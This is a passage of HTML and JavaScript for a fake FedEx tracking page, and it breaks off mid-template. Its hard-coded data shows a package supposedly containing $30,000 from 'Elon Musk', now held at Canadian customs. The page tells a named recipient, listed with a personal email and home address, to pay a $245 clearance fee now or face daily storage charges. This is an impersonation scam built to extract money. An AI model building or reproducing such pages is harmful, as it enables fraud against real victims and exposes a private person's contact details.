<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Track Packages - FedEx</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        'fedex-purple': '#4D148C',
                        'fedex-orange': '#FF6200',
                        'fedex-gray': '#767676',
                        'fedex-light-gray': '#F5F5F5',
                        'fedex-dark-gray': '#333333',
                        'fedex-blue': '#0071CE',
                        'fedex-green': '#6CBF00'
                    },
                    fontFamily: {
                        'fedex': ['Source Sans Pro', 'Arial', 'sans-serif']
                    }
                }
            }
        }
    </script>

    <style>
        * {
            font-family: 'Source Sans Pro', Arial, sans-serif;
        }

        .fedex-shadow {
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        @media (min-width: 768px) {
            .fedex-shadow {
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
        }

        .fedex-button {
            background: #4D148C;
            transition: all 0.2s ease;
        }

        .fedex-button:hover {
            background: #3D0F6B;
        }

        .progress-container {
            position: relative;
            background: #E5E7EB;
            height: 6px;
            border-radius: 3px;
            overflow: hidden;
        }

        @media (min-width: 768px) {
            .progress-container {
                height: 8px;
                border-radius: 4px;
            }
        }

        .progress-bar {
            background: linear-gradient(90deg, #FF6200, #4D148C);
            height: 100%;
            border-radius: inherit;
            transition: width 1.5s ease-in-out;
            position: relative;
        }

        .modal-backdrop {
            backdrop-filter: blur(2px);
        }

        @media (min-width: 768px) {
            .modal-backdrop {
                backdrop-filter: blur(4px);
            }
        }

        .page-section {
            display: none;
        }

        .page-section.active {
            display: block;
        }

        .timeline-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            position: absolute;
            left: -5px;
            top: 6px;
        }

        @media (min-width: 768px) {
            .timeline-dot {
                width: 12px;
                height: 12px;
                left: -6px;
            }
        }

        .timeline-line {
            width: 2px;
            background: #E5E7EB;
            position: absolute;
            left: -1px;
            top: 16px;
            bottom: -16px;
        }

        .timeline-item:last-child .timeline-line {
            display: none;
        }

        .map-container {
            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
            position: relative;
            overflow: hidden;
            height: 180px;
        }

        @media (min-width: 768px) {
            .map-container {
                height: 250px;
            }
        }

        .route-line {
            position: absolute;
            top: 50%;
            left: 10%;
            right: 10%;
            height: 3px;
            background: linear-gradient(90deg, #4D148C, #FF6200, #6CBF00);
            border-radius: 2px;
            transform: translateY(-50%);
        }

        .route-marker {
            position: absolute;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            top: 50%;
            transform: translateY(-50%);
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
            border: 2px solid white;
        }

        .route-marker.origin {
            left: 10%;
            background: #4D148C;
        }

        .route-marker.current {
            left: 65%;
            background: #FF6200;
            animation: pulse 2s infinite;
        }

        .route-marker.destination {
            right: 10%;
            background: #6CBF00;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 98, 0, 0.7); }
            50% { box-shadow: 0 0 0 10px rgba(255, 98, 0, 0); }
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            padding: 4px 8px;
            border-radius: 16px;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        @media (min-width: 768px) {
            .status-badge {
                padding: 6px 12px;
                border-radius: 20px;
                font-size: 14px;
                letter-spacing: 0.5px;
            }
        }

        .status-registered {
            background: #FEF3C7;
            color: #B45309;
            border: 1px solid #FCD34D;
        }

        .status-awaiting-clearance {
            background: #FECACA;
            color: #B91C1C;
            border: 1px solid #FCA5A5;
        }

        .status-in-transit {
            background: #DBEAFE;
            color: #1E40AF;
            border: 1px solid #93C5FD;
        }

        .status-delivered {
            background: #D1FAE5;
            color: #065F46;
            border: 1px solid #6EE7B7;
        }

        .clearance-notice {
            background: linear-gradient(135deg, #FEF3C7, #FDE68A);
            border-left: 3px solid #F59E0B;
        }

        .notification {
            position: fixed;
            top: 16px;
            right: 16px;
            padding: 12px 16px;
            border-radius: 6px;
            color: white;
            font-weight: 600;
            z-index: 1000;
            animation: slideInRight 0.3s ease-out;
            max-width: 280px;
            font-size: 14px;
        }

        .notification.success { background: #059669; }
        .notification.error { background: #DC2626; }
        .notification.info { background: #0284C7; }
        .notification.warning { background: #D97706; }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #FF6200;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .service-card {
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .service-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }

        .feature-card {
            transition: all 0.2s ease;
            border: 1px solid #E5E7EB;
        }

        .feature-card:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            border-color: #FF6200;
        }

        .tab-button {
            padding: 12px 16px;
            border-bottom: 2px solid transparent;
            transition: all 0.2s ease;
            font-size: 14px;
        }

        .tab-button.active {
            border-bottom-color: #FF6200;
            color: #4D148C;
            font-weight: 600;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }
    </style>
</head>

<body class="bg-white font-fedex">
    <!-- Header -->
    <header class="bg-white border-b border-gray-200 sticky top-0 z-40">
        <div class="bg-fedex-purple text-white py-1">
            <div class="max-w-7xl mx-auto px-4 flex justify-between items-center text-xs sm:text-sm">
                <div class="flex space-x-2 sm:space-x-4">
                    <span>English</span>
                    <span class="status-indicator"></span>
                    <span class="hidden sm:inline">Live System</span>
                </div>
                <div class="flex space-x-2 sm:space-x-4">
                    <a href="#" class="hover:text-fedex-orange" onclick="showPage('support')">Support</a>
                    <a href="#" class="hover:text-fedex-orange" onclick="showPage('contact')">Contact</a>
                    <a href="#" class="hover:text-fedex-orange" onclick="showPage('locations')">Locations</a>
                </div>
            </div>
        </div>

        <div class="max-w-7xl mx-auto px-4 py-3 sm:py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center cursor-pointer" onclick="showPage('main')">
                    <div class="bg-fedex-purple text-white px-2 py-1 sm:px-3 sm:py-2 font-bold text-lg sm:text-2xl">Fed</div>
                    <div class="bg-fedex-orange text-white px-2 py-1 sm:px-3 sm:py-2 font-bold text-lg sm:text-2xl">Ex</div>
                </div>

                <nav class="hidden lg:flex space-x-8">
                    <a href="#" class="text-fedex-dark-gray hover:text-fedex-purple font-semibold" onclick="showPage('ship')">Ship</a>
                    <a href="#" class="text-fedex-purple font-semibold border-b-2 border-fedex-orange pb-3" onclick="showPage('main')">Track</a>
                    <a href="#" class="text-fedex-dark-gray hover:text-fedex-purple font-semibold" onclick="showPage('manage')">Manage</a>
                    <a href="#" class="text-fedex-dark-gray hover:text-fedex-purple font-semibold" onclick="showPage('support')">Support</a>
                </nav>

                <button class="lg:hidden p-2" onclick="toggleMobileMenu()" aria-label="Toggle menu">
                    <i class="fas fa-bars text-xl sm:text-2xl text-fedex-dark-gray"></i>
                </button>
            </div>
        </div>
    </header>

    <!-- Mobile Menu -->
    <div id="mobile-menu" class="lg:hidden bg-white border-b border-gray-200">
        <div class="px-4 py-2 space-y-2">
            <a href="#" class="block py-2 text-fedex-dark-gray hover:text-fedex-purple" onclick="showPage('ship'); hideMobileMenu();">Ship</a>
            <a href="#" class="block py-2 text-fedex-purple font-semibold" onclick="showPage('main'); hideMobileMenu();">Track</a>
            <a href="#" class="block py-2 text-fedex-dark-gray hover:text-fedex-purple" onclick="showPage('manage'); hideMobileMenu();">Manage</a>
            <a href="#" class="block py-2 text-fedex-dark-gray hover:text-fedex-purple" onclick="showPage('support'); hideMobileMenu();">Support</a>
        </div>
    </div>

    <!-- Main Content Container -->
    <div id="content-container">
        <!-- MAIN TRACKING PAGE -->
        <div id="main-page" class="page-section active">
            <main class="min-h-screen bg-fedex-light-gray">
                <section class="bg-white py-8 sm:py-12">
                    <div class="max-w-6xl mx-auto px-4">
                        <div class="text-center mb-6 sm:mb-8">
                            <h1 class="text-2xl sm:text-4xl font-bold text-fedex-dark-gray mb-2 sm:mb-4">Track Your Package</h1>
                            <p class="text-lg sm:text-xl text-fedex-gray">Enter your tracking number to get real-time updates</p>
                        </div>

                        <div class="max-w-2xl mx-auto">
                            <div class="bg-white border border-gray-200 rounded-lg fedex-shadow p-4 sm:p-6">
                                <form id="tracking-form">
                                    <div class="mb-4">
                                        <label class="block text-base sm:text-lg font-semibold text-fedex-dark-gray mb-2 sm:mb-3">
                                            Track by tracking number
                                        </label>
                                        <div class="relative">
                                            <input type="text" id="tracking-number" required class="w-full px-4 py-3 sm:py-4 text-base sm:text-lg border-2 border-gray-300 rounded-lg focus:border-fedex-purple focus:outline-none transition-colors" placeholder="Enter your tracking number">
                                            <button type="submit" id="track-button" class="absolute right-2 top-2 fedex-button text-white px-4 sm:px-6 py-2 rounded-lg font-semibold transition-colors text-sm sm:text-base">
                                                <span id="track-text">Track</span>
                                                <span id="track-loading" class="hidden"><div class="loading-spinner"></div></span>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </section>

                <section class="py-8 sm:py-12 bg-white">
                    <div class="max-w-6xl mx-auto px-4">
                        <div class="text-center mb-8 sm:mb-12">
                            <h2 class="text-2xl sm:text-3xl font-bold text-fedex-dark-gray mb-2 sm:mb-4">Why Choose FedEx?</h2>
                            <p class="text-lg sm:text-xl text-fedex-gray">The world's most trusted shipping and logistics network</p>
                        </div>
                        
                        <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
                            <div class="feature-card bg-white rounded-lg p-4 sm:p-6 text-center">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-fedex-purple to-blue-600 rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-globe-americas text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-sm sm:text-lg font-bold text-fedex-dark-gray mb-1 sm:mb-2">Global Network</h3>
                                <p class="text-fedex-gray text-xs sm:text-sm">Connecting 220+ countries and territories worldwide</p>
                            </div>

                            <div class="feature-card bg-white rounded-lg p-4 sm:p-6 text-center">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-fedex-orange to-red-500 rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-shipping-fast text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-sm sm:text-lg font-bold text-fedex-dark-gray mb-1 sm:mb-2">Express Delivery</h3>
                                <p class="text-fedex-gray text-xs sm:text-sm">Fastest international express delivery services</p>
                            </div>

                            <div class="feature-card bg-white rounded-lg p-4 sm:p-6 text-center">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-fedex-green to-green-600 rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-shield-alt text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-sm sm:text-lg font-bold text-fedex-dark-gray mb-1 sm:mb-2">Secure Handling</h3>
                                <p class="text-fedex-gray text-xs sm:text-sm">Advanced security for high-value shipments</p>
                            </div>

                            <div class="feature-card bg-white rounded-lg p-4 sm:p-6 text-center">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-fedex-blue to-blue-700 rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-clock text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-sm sm:text-lg font-bold text-fedex-dark-gray mb-1 sm:mb-2">Real-Time Tracking</h3>
                                <p class="text-fedex-gray text-xs sm:text-sm">Track your package every step of the way</p>
                            </div>
                        </div>
                    </div>
                </section>

                <section class="py-8 sm:py-12 bg-fedex-light-gray">
                    <div class="max-w-6xl mx-auto px-4">
                        <h2 class="text-2xl sm:text-3xl font-bold text-fedex-dark-gray text-center mb-6 sm:mb-8">Our Services</h2>
                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 sm:gap-6">
                            <div class="service-card bg-white rounded-lg fedex-shadow p-4 sm:p-6 text-center" onclick="showPage('ship')">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-fedex-purple rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-shipping-fast text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-lg sm:text-xl font-bold text-fedex-dark-gray mb-1 sm:mb-2">Ship</h3>
                                <p class="text-fedex-gray text-sm">Create shipping labels and schedule pickups</p>
                            </div>

                            <div class="service-card bg-white rounded-lg fedex-shadow p-4 sm:p-6 text-center" onclick="showPage('main')">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-fedex-orange rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-search text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-lg sm:text-xl font-bold text-fedex-dark-gray mb-1 sm:mb-2">Track</h3>
                                <p class="text-fedex-gray text-sm">Monitor your shipments in real-time</p>
                            </div>

                            <div class="service-card bg-white rounded-lg fedex-shadow p-4 sm:p-6 text-center" onclick="showPage('manage')">
                                <div class="w-12 h-12 sm:w-16 sm:h-16 bg-fedex-blue rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                    <i class="fas fa-cog text-white text-lg sm:text-2xl"></i>
                                </div>
                                <h3 class="text-lg sm:text-xl font-bold text-fedex-dark-gray mb-1 sm:mb-2">Manage</h3>
                                <p class="text-fedex-gray text-sm">Access your shipping history and preferences</p>
                            </div>
                        </div>
                    </div>
                </section>
            </main>
        </div>

        <!-- Tracking Modal -->
        <div id="tracking-modal" class="fixed inset-0 bg-black bg-opacity-50 modal-backdrop hidden items-center justify-center z-50 p-2 sm:p-4">
            <div class="bg-white rounded-lg w-full max-w-7xl max-h-[95vh] overflow-y-auto">
                <div class="bg-fedex-purple text-white p-3 sm:p-6 rounded-t-lg sticky top-0 z-10">
                    <div class="flex justify-between items-center">
                        <div>
                            <h2 class="text-lg sm:text-2xl font-bold">Tracking Details</h2>
                            <p class="text-fedex-orange text-sm sm:text-lg font-semibold" id="modal-tracking-number">Loading...</p>
                        </div>
                        <button id="close-modal" class="text-white hover:text-fedex-orange text-lg sm:text-2xl">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                </div>

                <div class="p-3 sm:p-6" id="modal-content">
                    <div class="flex justify-center items-center py-12">
                        <div class="loading-spinner mr-3"></div>
                        <span>Loading package information...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer class="bg-fedex-dark-gray text-white py-8 sm:py-12">
        <div class="max-w-6xl mx-auto px-4">
            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 sm:gap-8">
                <div>
                    <div class="flex items-center mb-3 sm:mb-4 cursor-pointer" onclick="showPage('main')">
                        <div class="bg-fedex-purple text-white px-2 py-1 font-bold text-base sm:text-lg">Fed</div>
                        <div class="bg-fedex-orange text-white px-2 py-1 font-bold text-base sm:text-lg">Ex</div>
                    </div>
                    <p class="text-gray-300 text-sm">Connecting people and possibilities around the world.</p>
                </div>

                <div>
                    <h4 class="font-bold text-base sm:text-lg mb-3 sm:mb-4">Our Company</h4>
                    <ul class="space-y-1 sm:space-y-2 text-gray-300 text-sm">
                        <li><a href="#" class="hover:text-fedex-orange">About FedEx</a></li>
                        <li><a href="#" class="hover:text-fedex-orange">Investor Relations</a></li>
                        <li><a href="#" class="hover:text-fedex-orange">Careers</a></li>
                        <li><a href="#" class="hover:text-fedex-orange">Sustainability</a></li>
                    </ul>
                </div>

                <div>
                    <h4 class="font-bold text-base sm:text-lg mb-3 sm:mb-4">Support</h4>
                    <ul class="space-y-1 sm:space-y-2 text-gray-300 text-sm">
                        <li><a href="#" class="hover:text-fedex-orange" onclick="showPage('support')">Customer Support</a></li>
                        <li><a href="#" class="hover:text-fedex-orange">Find Locations</a></li>
                        <li><a href="#" class="hover:text-fedex-orange">Service Guide</a></li>
                        <li><a href="#" class="hover:text-fedex-orange">Shipping Tools</a></li>
                    </ul>
                </div>

                <div>
                    <h4 class="font-bold text-base sm:text-lg mb-3 sm:mb-4">Connect</h4>
                    <div class="flex space-x-3 sm:space-x-4 mb-3 sm:mb-4">
                        <a href="#" class="text-gray-300 hover:text-fedex-orange text-lg sm:text-xl">
                            <i class="fab fa-facebook"></i>
                        </a>
                        <a href="#" class="text-gray-300 hover:text-fedex-orange text-lg sm:text-xl">
                            <i class="fab fa-twitter"></i>
                        </a>
                        <a href="#" class="text-gray-300 hover:text-fedex-orange text-lg sm:text-xl">
                            <i class="fab fa-linkedin"></i>
                        </a>
                        <a href="#" class="text-gray-300 hover:text-fedex-orange text-lg sm:text-xl">
                            <i class="fab fa-instagram"></i>
                        </a>
                    </div>
                    <div class="text-gray-300">
                        <p class="text-xs sm:text-sm">Emergency Support:</p>
                        <p class="font-semibold text-sm">1-800-FEDEX (<a href="tel:1-800-33339">1-800-33339</a>)</p>
                    </div>
                </div>
            </div>

            <div class="border-t border-gray-600 mt-6 sm:mt-8 pt-6 sm:pt-8 text-center">
                <p class="text-gray-300 text-xs sm:text-sm">© 2026 FedEx Corporation. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script>
        // Mock Database
        const mockData = {
            packages: [
                {
                    tracking_number: 'FX261008JL',
                    status: 'on_hold',
                    service_type: 'FedEx International Priority',
                    current_location: 'CBSA Customs Facility, Ontario, Canada',
                    estimated_delivery: 'Pending Customs Clearance',
                    ship_date: '2026-01-14',
                    weight: '4500',
                    dimensions: '96" x 120" x 72"',
                    declared_value: 30000.00,
                    contents: '$30,000',
                    reference_number: 'HIGH-VALUE-SHIPMENT-DT',
                    insurance_coverage: 30000.00,
                    progress_percentage: 75,
                    requires_clearance: true,
                    clearance_payment_required: 245,
                    sender_name: 'Elon Musk',
                    sender_company: 'FedEx Office Paris',
                    sender_address: '1 Rocket Road',
                    sender_city: 'Hawthorne, TX 90250, United States',
                    sender_phone: '',
                    recipient_name: 'Steven Venditti',
                    recipient_address: '32 Rory Road',
                    recipient_city: 'Toronto, Ontario, Canada M6L 3G2',
                    recipient_phone: '',
                    recipient_email: 'stevenvenditti20@gmail.com'
                }
            ],
            
            tracking_events: [
                {
                    tracking_number: 'FX261008JL',
                    status: 'registered',
                    location: 'HAWTHORNE, TX',
                    event_date: '2026-01-14',
                    event_time: '10:30:00',
                    description: 'Package has been registered at the FedEx facility and secured.',
                    is_latest: false,
                    event_type: 'status_update'
                },
                {
                    tracking_number: 'FX261008JL',
                    status: 'in_transit',
                    location: 'MEMPHIS, TN',
                    event_date: '2026-01-14',
                    event_time: '18:45:00',
                    description: 'Package departed Memphis International Hub. En route to Canada.',
                    is_latest: false,
                    event_type: 'departure'
                },
                {
                    tracking_number: 'FX261008JL',
                    status: 'in_transit',
                    location: 'ONTARIO, CANADA',
                    event_date: '2026-01-15',
                    event_time: '03:30:00',
                    description: 'Package has arrived in Ontario, Canada.',
                    is_latest: false,
                    event_type: 'arrival'
                },
                {
                    tracking_number: 'FX261008JL',
                    status: 'on_hold',
                    location: 'CBSA CUSTOMS FACILITY, ONTARIO',
                    event_date: '2026-01-16',
                    event_time: '08:30:00',
                    description: 'Shipment is currently on hold at the CBSA customs office for inspection.',
                    is_latest: false,
                    event_type: 'customs_hold'
                },
                {
                    tracking_number: 'FX261008JL',
                    status: 'on_hold',
                    location: 'CBSA CUSTOMS FACILITY, ONTARIO',
                    event_date: '2026-01-16',
                    event_time: '11:45:00',
                    description: 'Customs clearance required: $245 needed for customs and regulatory compliance clearance, including tax and VAT.',
                    is_latest: true,
                    event_type: 'clearance_required'
                }
            ]
        };

        // Core Tracking Functions
        async function trackPackage(trackingNumber) {
            try {
                const modalContent = document.getElementById('modal-content');
                const trackingNumberElement = document.getElementById('modal-tracking-number');
                
                trackingNumberElement.textContent = trackingNumber;
                modalContent.innerHTML = `
                    <div class="flex justify-center items-center py-12">
                        <div class="loading-spinner mr-3"></div>
                        <span>Loading package information...</span>
                    </div>
                `;

                // Simulate API delay
                await new Promise(resolve => setTimeout(resolve, 1000));

                const packageData = mockData.packages.find(pkg => 
                    pkg.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
                );

                if (!packageData) {
                    throw new Error('Package not found');
                }

                const events = mockData.tracking_events.filter(event => 
                    event.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
                );

                const fullPackageData = { ...packageData, timeline: events };
                displayTrackingModal(fullPackageData);
                return true;

            } catch (error) {
                console.error('Error tracking package:', error);
                
                const modalContent = document.getElementById('modal-content');
                modalContent.innerHTML = `
                    <div class="text-center py-12">
                        <i class="fas fa-exclamation-triangle text-fedex-orange text-3xl sm:text-4xl mb-4"></i>
                        <h3 class="text-lg sm:text-xl font-bold text-fedex-dark-gray mb-2">Package Not Found</h3>
                        <p class="text-fedex-gray text-sm sm:text-base">The tracking number "${trackingNumber}" could not be found in our system.</p>
                        <p class="text-fedex-gray mt-2 text-sm sm:text-base">Please check the tracking number and try again.</p>
                    </div>
                `;
                return false;
            }
        }

        function displayTrackingModal(data) {
            const modalContent = document.getElementById('modal-content');
            modalContent.innerHTML = generateTrackingContent(data);
            showModal('tracking-modal');
        }

        function generateTrackingContent(data) {
            const progressSteps = [
                { name: 'Registered', icon: 'check', status: getStepStatus('registered', data.status) },
                { name: 'In Transit', icon: 'plane', status: getStepStatus('in_transit', data.status) },
                { name: 'Arrived', icon: 'map-marker-alt', status: getStepStatus('arrived', data.status) },
                { name: 'On Hold', icon: 'pause-circle', status: getStepStatus('on_hold', data.status) },
                { name: 'Out for Delivery', icon: 'truck', status: getStepStatus('out_for_delivery', data.status) },
                { name: 'Delivered', icon: 'home', status: getStepStatus('delivered', data.status) }
            ];

            const statusClass = getStatusClass(data.status);

            return `
                <div class="bg-fedex-light-gray rounded-lg p-3 sm:p-6 mb-4 sm:mb-6">
                    <div class="flex flex-col lg:flex-row justify-between items-start lg:items-center space-y-3 sm:space-y-4 lg:space-y-0 mb-4 sm:mb-6">
                        <div>
                            <div class="flex flex-col sm:flex-row sm:items-center sm:space-x-3 mb-2 sm:mb-3">
                                <span class="status-badge ${statusClass} mb-2 sm:mb-0">
                                    <i class="fas fa-${getStatusIcon(data.status)} mr-1 sm:mr-2"></i>${formatStatus(data.status)}
                                </span>
                                <span class="text-fedex-gray text-xs sm:text-base">${data.service_type}</span>
                            </div>
                            <p class="text-fedex-dark-gray font-semibold text-sm sm:text-lg">Expected delivery: ${data.estimated_delivery}</p>
                            <p class="text-fedex-gray text-xs sm:text-base">Currently at: ${data.current_location}</p>
                        </div>
                        <div class="flex flex-col space-y-2 w-full sm:w-auto">
                            <button onclick="generatePDF('${data.tracking_number}')" class="fedex-button text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold text-xs sm:text-base w-full sm:w-auto">
                                <i class="fas fa-file-pdf mr-1 sm:mr-2"></i>Download Receipt
                            </button>
                            <button onclick="requestEmailUpdates('${data.tracking_number}')" class="border border-fedex-purple text-fedex-purple px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-fedex-purple hover:text-white transition-colors text-xs sm:text-base w-full sm:w-auto">
                                <i class="fas fa-envelope mr-1 sm:mr-2"></i>Email Updates
                            </button>
                        </div>
                    </div>

                    <div class="mb-3 sm:mb-4">
                        <div class="flex justify-between text-xs sm:text-sm text-fedex-gray mb-2">
                            <span>Shipment Progress</span>
                            <span>${data.progress_percentage}% Complete</span>
                        </div>
                        <div class="progress-container">
                            <div class="progress-bar" style="width: ${data.progress_percentage}%"></div>
                        </div>
                    </div>

                    ${data.requires_clearance ? `
                    <div class="clearance-notice rounded-lg p-3 sm:p-4">
                        <div class="flex items-start space-x-2 sm:space-x-3">
                            <i class="fas fa-exclamation-triangle text-yellow-600 text-lg sm:text-xl mt-1"></i>
                            <div>
                                <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">CUSTOMS CLEARANCE REQUIRED</h4>
                                <p class="text-yellow-700 text-xs sm:text-sm mb-2">
                                    Your shipment has successfully completed international transit and is currently 
                                    <strong>on hold at the CBSA customs facility</strong> pending final clearance.
                                </p>
                                <p class="text-yellow-700 text-xs sm:text-sm">
                                    A customs clearance fee of <strong class="text-red-600">$245</strong> is required to release the package for final delivery to your doorstep.
                                </p>
                                
                                <div class="bg-white bg-opacity-50 rounded p-3 sm:p-4 my-3 sm:my-4">
                                    <h5 class="font-semibold text-yellow-800 mb-2 text-xs sm:text-sm">PAYMENT BREAKDOWN:</h5>
                                    <div class="grid grid-cols-2 gap-2 text-xs sm:text-sm">
                                        <div class="flex justify-between">
                                            <span class="text-yellow-700">Customs Processing Fee:</span>
                                            <span class="font-bold">$85.00</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-yellow-700">Import Tax & VAT:</span>
                                            <span class="font-bold">$140.00</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-yellow-700">Regulatory Compliance:</span>
                                            <span class="font-bold">$20.00</span>
                                        </div>
                                        <div class="col-span-2 border-t border-yellow-200 mt-1 pt-1">
                                            <div class="flex justify-between font-bold text-yellow-800">
                                                <span>TOTAL REQUIRED:</span>
                                                <span>$245.00</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="bg-red-50 border-l-3 border-red-500 p-2 sm:p-3 rounded-r mb-3">
                                    <p class="text-red-700 text-xs sm:text-sm font-semibold mb-1">
                                        ⚠️ IMPORTANT NOTICE:
                                    </p>
                                    <p class="text-red-700 text-xs sm:text-sm">
                                        If the $245 clearance fee is not paid today, an additional <strong>$25 daily storage fee</strong> 
                                        will be applied starting tomorrow until payment is received.
                                    </p>
                                </div>
                                
                                <div class="mt-3 sm:mt-4">
                                    <p class="text-yellow-700 text-xs sm:text-sm">
                                        Once payment is received, your package will be immediately released and scheduled for final delivery to:
                                        <br>
                                        <span class="font-semibold">${data.recipient_address}, ${data.recipient_city}</span>
                                    </p>
                                </div>
                                
                                <div class="mt-3 sm:mt-4">
                                    <button onclick="requestClearance('${data.tracking_number}')" 
                                            class="fedex-button text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold text-xs sm:text-base w-full">
                                        <i class="fas fa-credit-card mr-1 sm:mr-2"></i>Pay Customs Clearance Now
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    ` : ''}
                </div>

                <div class="mb-6 sm:mb-8">
                    <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-4 sm:mb-6">Shipment Journey</h3>
                    <div class="grid grid-cols-3 sm:grid-cols-6 gap-1 sm:gap-2">
                        ${progressSteps.map(step => `
                            <div class="progress-step text-center">
                                <div class="w-6 h-6 sm:w-8 sm:h-8 ${step.status === 'completed' ? 'bg-fedex-green' : step.status === 'current' ? 'bg-fedex-orange' : 'bg-gray-300'} rounded-full flex items-center justify-center mx-auto mb-1 sm:mb-2">
                                    <i class="fas fa-${step.icon} text-white text-xs"></i>
                                </div>
                                <h4 class="font-semibold ${step.status ? 'text-fedex-dark-gray' : 'text-gray-400'} text-xs">${step.name}</h4>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-8">
                    <div>
                        <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-4 sm:mb-6">Shipment Timeline</h3>
                        <div class="relative">
                            ${data.timeline.map((event, index) => `
                                <div class="timeline-item mb-4 sm:mb-6 pl-3 sm:pl-6 relative">
                                    <div class="timeline-dot ${event.is_latest ? 'bg-fedex-orange' : 'bg-fedex-green'}"></div>
                                    ${index < data.timeline.length - 1 ? '<div class="timeline-line"></div>' : ''}
                                    <div class="bg-white border border-gray-200 rounded-lg p-2 sm:p-4">
                                        <div class="flex justify-between items-start mb-1 sm:mb-2">
                                            <h4 class="font-semibold text-fedex-dark-gray text-xs sm:text-base">${formatStatus(event.status)}</h4>
                                            <span class="text-xs text-fedex-gray">${event.is_latest ? 'Current' : 'Completed'}</span>
                                        </div>
                                        <p class="text-fedex-gray mb-1 text-xs sm:text-sm">${event.location}</p>
                                        <p class="text-xs text-fedex-gray">${formatDate(event.event_date)} ${event.event_time}</p>
                                        <p class="text-xs sm:text-sm text-fedex-gray mt-1 sm:mt-2">${event.description}</p>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>

                    <div>
                        <div class="bg-white border border-gray-200 rounded-lg p-3 sm:p-6 mb-4 sm:mb-6">
                            <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-3 sm:mb-4">Package Details</h3>
                            <div class="space-y-2 sm:space-y-3 text-xs sm:text-base">
                                <div class="flex justify-between">
                                    <span class="text-fedex-gray">Service:</span>
                                    <span class="font-semibold">${data.service_type}</span>
                                </div>
                                <div class="flex justify-between">
                                    <span class="text-fedex-gray">Weight:</span>
                                    <span class="font-semibold">${data.weight} kg</span>
                                </div>
                                <div class="flex justify-between">
                                    <span class="text-fedex-gray">Dimensions:</span>
                                    <span class="font-semibold">${data.dimensions}</span>
                                </div>
                                <div class="flex justify-between">
